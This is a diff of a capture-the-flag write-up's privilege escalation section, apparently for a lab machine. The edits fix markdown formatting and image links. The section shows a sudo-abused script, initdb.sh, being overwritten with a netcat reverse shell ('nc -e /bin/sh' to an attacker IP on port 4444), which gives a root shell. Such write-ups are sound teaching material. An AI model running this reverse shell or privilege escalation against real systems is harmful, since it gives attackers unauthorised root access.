@@ -101,7 +101,7 @@ We get our low priv shell
 
 ### Privilege Escalation
 
-First thing I typically check is sudo -l\`, and we have  a hit this time.
+First thing I typically check is `sudo -l\`, and we have  a hit this time.
 
 ![](../../assets/images/headless/sduo.png)
 
@@ -112,15 +112,15 @@ Syscheck is the name of the integrity checking process inside OSSEC.It runs peri
 ```
 
 Checking the content of /usr/bin/syscheck, we see that it is processing  an initdb.sh file. We can add our own inidb.sh file, which will be a payload.
-![](../../assets/images/headless/sduo.png)
+![](../../assets/images/headless/init.png)
 
+```
 echo "nc -e /bin/sh 10.10.16.63 4444" > initdb.sh
-
 chmod +x initdb.sh
-
 sudo /usr/bin/syscheck
+```
 
-![](/../../assets/images/headless/init.png)
+![](/../../assets/images/headless/run.png)
 
 And we get our root shell on port 4444
 
